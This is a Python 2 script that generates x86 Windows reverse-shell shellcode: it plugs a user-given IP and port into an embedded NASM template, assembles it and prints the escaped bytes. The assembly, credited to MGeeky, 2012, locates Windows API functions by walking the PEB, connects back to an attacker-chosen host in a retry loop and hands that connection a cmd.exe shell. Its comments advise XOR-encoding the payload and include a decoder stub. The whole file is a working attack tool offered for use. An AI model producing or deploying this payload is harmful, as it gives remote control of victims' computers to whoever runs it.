from binascii import unhexlify
import binascii
import sys
import os
from shell import shell
import time
import socket



if len (sys.argv) != 3 :
    print "\r"
    print "Creates x86 Windows Reverse shell"
    print "WARNING: Fails if IP Address has nullbyte"
    print "Usage: python winrev.py 127.0.0.1 4444\r\n"
    sys.exit (1)



def convert_port(port):
    if port <= 65535:
        network_order = socket.htons(port)
        network_hex = hex(network_order)
        return network_order, network_hex
    else:
        print("[!] port range is over 65535")
        sys.exit(1)

def convert_ip_addr(ip_addr):
    ip_addr_hex = hex(int(ip_addr))[2:]

    if len(ip_addr_hex) < 2:
        ip_addr_hex = "0" + ip_addr_hex

    if ip_addr_hex == "00":
        print("[!] The final shellcode has '\\x00' inside")
        sys.exit(1)

    return ip_addr_hex


port = int(sys.argv[2])
ip_addr = str(sys.argv[1])
network, inhex = convert_port(port)
network, inhex = convert_port(port)

ip_addr_hex = ""
for i in range(0,4):
    ip_addr_hex += convert_ip_addr(ip_addr.split('.')[::-1][i])


hexport = str("\t%.16s")% inhex
hexip = str("\t0x%.16s") % ip_addr_hex

shellasm = """
;
;   Active Network-binding shellcode for all versions of MS Windows.
;	This shellcode connects to remote machine in order to
;	let attacker control of seized computer. 
;
;	Preparations:
;	- set yours machine IP address DWORD in VARIABLES AREA (under _main)
;	- open specified port on your machine
;
;	Some concepts based on LSD-pl.net team ideas
;   MGeeky, 2012

[bits 32]


; ------------ VARIABLES AREA ----------
; REMEMBER TO ENCODE THIS SHELLCODE, from this
; point up to the end and prepend it with decryption
; routine. Prototype of example decryption routine
; has been written above _main label.

;%%define ATTACKERS_IP	db	0x7f, 0x00, 0x00, 0x01	
							; default: 127.0.0.1
;%%define ATTACKERS_PORT	db	0x15, 0xB3				
							; default: 5555

; --------------------------------------


%%macro GetProc 1-2	1
	call %%%%p
	db	%%1, 0
	%%%%p:
	%%if %%2 == 1
		push dword [ebp]	; use kernel32.dll module handle
	%%elif %%2 == 2
		push dword [ebp-4]	; use ws2_32.dll module handle
	%%endif
	call dword [ebp-8]
%%endmacro


; =================================================
section .text

_start:
	; Shellcode's stack frame:
	;	EBP		- kernel32 handle
	;	EBP-4	- ws2_32 handle
	%%define GetProcAddress			EBP-0x08
	%%define LoadLibraryA			EBP-0x0c
	%%define CreateProcessA			EBP-0x10
	%%define GetSystemDirectoryA		EBP-0x14
	%%define ExitProcess				EBP-0x18
	%%define WSASocketA				EBP-0x1C
	%%define connect					EBP-0x20
	%%define WSAStartup				EBP-0x24
	%%define hSocket					EBP-0x28
	;	system directory buffer up to EBP-0x2e
	%%define SystemDirBuf			EBP-0x60
	;	STARTUPINFO structure buffer up to EBP-0x62
	%%define StartInfo				EBP-0xB6
	;	WSAData structure up to EBP-0xB8
	%%define WSAData					EBP-0x168
	;	PROCESS_INFORMATION structure up to EBP-0x188
	%%define ProcessInfo				EBP-0x198


	; Prototype of decryption routine for exact shellcode
	;_start:
	;   jmp		short _docall
	;_dumpaddr:
	;   pop		ebx
	;   mov		edx, ebx
	;   _decode:
	;	  xor   byte [ebx], 0xAA
	;	  inc	ebx
	;	  cmp	dword [ebx-4], 0xABDEC0DE
	;	  jne	_decode
	;	  jmp	edx
	;_docall:
	;   call	_dumpaddr


; =================================================
_main:

	; offset relative to ESP from which stack will be used
	%%define	STACK_OFFSET 0x1000

	; Setting and zeroing stack area

	sub		esp, STACK_OFFSET
	mov		ebp, esp
	mov		ecx, 0x200
	add		ebp, ecx
	xor		eax, eax
	mov		edi, esp
	cld
	rep		stosd

    ; Phase 1 - Initalise shellcode's enviroment
	;	 Stage A:	GetProcAddress, LoadLibraryA, 
	;				LoadLibraryA("ws2_32.dll")
    call	_GPAandLL
	test	ebx, ebx
	je		error

	mov		[ebp], ebx
	mov		[GetProcAddress], ecx
	mov		[LoadLibraryA], edx

	call	_a
	db		"ws2_32.dll",0
	_a:
	call	[ebp-0x0c]
	test	eax, eax
	je		error

	mov		[ebp-4], eax

	;	Stage B: Locate rest of needed procedures
	;
	; kernel32
	GetProc "CreateProcessA"
	mov		[CreateProcessA], eax
	GetProc "GetSystemDirectoryA"
	mov		[GetSystemDirectoryA], eax
	GetProc "ExitProcess"
	mov		[ExitProcess], eax

	; ws2_32
	GetProc	"WSASocketA", 2
	mov		[WSASocketA], eax
	GetProc	"connect", 2
	mov		[connect], eax
	GetProc	"WSAStartup", 2
	mov		[WSAStartup], eax

	;
	; Phase 2:	Initialising WINSOCK interface and 
	;			connecting to the attacker's machine

	lea		ebx, [WSAData]
	push	dword ebx
	push	dword 0x202
	call	[WSAStartup]
	xor		eax, eax
	push	eax
	push	eax
	push	eax
	push	eax
	inc		eax
	push	eax		; SOCK_STREAM
	inc		eax
	push	eax		; AF_INET
	call	[WSASocketA]
	test	eax, eax
	je		error
	mov		[hSocket],	eax
	call	_next1

	_sockaddr:
	dw		0x0002	; sin_family
	dw      %s	; sin_port
	dd      %s	; sin_addr
	dd 0			; sin_zero
	dd 0

	_next1:
	pop		ebx
	push	0x10
	push	ebx
	push	eax
	call	[connect]
	test	eax, eax
	jne		_next1	; try to connect in a loop


	;
	; Phase 3:	Prepare shellcode's structures, variables, buffers
	;			and create shell

	; Stage A: Prepare CMD path
	push	50
	lea		ebx, [SystemDirBuf]
	push	ebx
	call	[GetSystemDirectoryA]
	test	eax, eax
	je		error

	call	_cmd
	db		"\cmd.exe",0
	_cmd:
	pop		esi
	lea		edi, [SystemDirBuf]
	add		edi, eax
	mov		ecx, 8
	cld
	rep		movsb

	; Stage B: create SHELL process
	lea		edi, [StartInfo]
	push	edi
	xor		ecx, ecx
	xor		eax, eax
	mov		cl, 0x54
	rep		stosb					; initalizing STARTUPINFO
	pop		edi
	mov		al, 0x44
	mov		[ebp-0xD6], eax
	mov		ebx, [hSocket]			; socket handle
	
	mov		dword [edi+0x38], ebx	; hStdInput
	mov		dword [edi+0x3c], ebx	; hStdOutput
	mov		dword [edi+0x40], ebx	; hStdError
	mov		dword [edi+0x44], ebx
	mov		cx, 0x0101				; STARTF_USESHOWWINDOW 
									; | STARTF_USESTDHANDLES
	mov		word [edi+0x2c], cx
	lea		eax, [ProcessInfo]
	push	eax						; ProcessInfo
	xor		eax, eax
	push	edi						; StartupInfo
	push	eax
	mov		ecx, 0x20				; NORMAL_PRIORITY_CLASS
	push	eax
	push	ecx
	xor		cl, 0x21
	push	ecx						; bInheritHandles = true
	push	eax
	push	eax
	lea		ecx, [SystemDirBuf]
	nop
	push	ecx						; lpCommandLine
	push	eax
	call	[CreateProcessA]
	jmp		error
	nop


; =================================================
; GetProcAddress & LoadLibraryA locating function.
;	It locates mentioned procedures addresses and returns:
;		EBX - kernel32 image base
;		ECX - GetProcAddress
;		EDX - LoadLibraryA
;
	nop
_GPAandLL:
	cld
	mov		edx, [fs:0x30]		; PEB
	mov     edx, [edx+0x0C]		; PEB.Ldr	
	mov     edx, [edx+0x14]		; PEB.Ldr.InLoadOrderModuleList

	; Locating kernel32.dll by hashing module name values
	_a_GPAandLL:
		mov     esi, [edx+0x28]	; LDR_MODULE.szImageName
		xor     ecx, ecx
		mov     cl, 0x18
		xor     edi, edi

		_b_GPAandLL:
			xor     eax, eax
			lodsb
			cmp     al, 0x61
			jl      _c_GPAandLL
			sub     al, 0x20

			_c_GPAandLL:
			ror     edi, 0x0D
			add     edi, eax
			loop    _b_GPAandLL
			
			cmp     edi, 0x6A4ABC5B	; kernel32.dll hash
			mov     ebx, [edx+0x10]	; LDR_MODULE.ImageBase
			mov     edx, [edx]
			
			jnz     _a_GPAandLL

	mov     edx, [ebx+0x3C]			; DOSHdr.e_lfanew
	add     edx, ebx				; EBX = ImageBase
	push    dword [edx+0x34]		; OptionalHeader.ImageBase
	mov     edx, [edx+0x78]			; EXPORT Directory RVA
	add     edx, ebx
	mov     esi, [edx+0x20]			; ExportDir.NamePtrTable
	add     esi, ebx
	xor     ecx, ecx

	_d_GPAandLL:
		inc     ecx
		lodsd
		add     eax, ebx
		
		cmp     dword [eax], 0x50746547		; GetP
		jnz     _d_GPAandLL
		
		cmp     dword [eax+4], 0x41636F72	; rocA
		jnz     _d_GPAandLL
		
		cmp     dword [eax+8], 0x65726464	; ddre
		jnz     _d_GPAandLL

	dec     ecx						; ECX = function index
	mov     esi, [edx+0x24]			; ExportDir.OrdinalTable
	add     esi, ebx
	mov     cx, [esi+ecx*2]			; CX = Ordinal Value
	mov     esi, [edx+0x1C]			; ExportDir.AddressPtrTable
	add     esi, ebx
	mov     edx, [esi+ecx*4]		; Address of function
	add     edx, ebx
	push	edx
	call	_GPAandLL_LL
	db		"LoadLibraryA",0
	_GPAandLL_LL:
	push	ebx
	call	edx
	mov		edx, eax
	pop		ecx
	pop		ebx
	xor		eax, eax
	ret

; =================================================
error:
	; If ExitProcess has been located - call it.
	; There is no chance to revive current process to 
	; its execution flow because we have damaged
	; it's stack so process will most likely crash when
	; we return to its context.
	mov eax, dword [ExitProcess]
	test eax, eax
	je .ret
	push 0
	call eax
	.ret:
	    ret

; =================================================
; End of decryption marker constant
;dd	0xABDEC0DE

""" % (hexport,hexip)

print "Writing to template...\n%s-%s " % (hexport,hexip)

file = open("shellcode.asm","wb")
file.write(shellasm)
file.close()

writeasm = shell('nasm shellcode.asm')
print "Creating shellcode..."

bindshell = 'reverse= "'
length = 0
with open("shellcode", "rb") as f:
    byte = f.read(1)
    while byte != "":
        if len(byte) > 0:
            bindshell += '\\x' + '%02.X' % ord(byte)
            length += 1
        byte = f.read(1)
bindshell += '"'
print "Length: %s bytes\n " % str(length)
print bindshell

# clearbin = shell('rm shellcode')
# clearasm = shell('rm shellcode.asm')
        
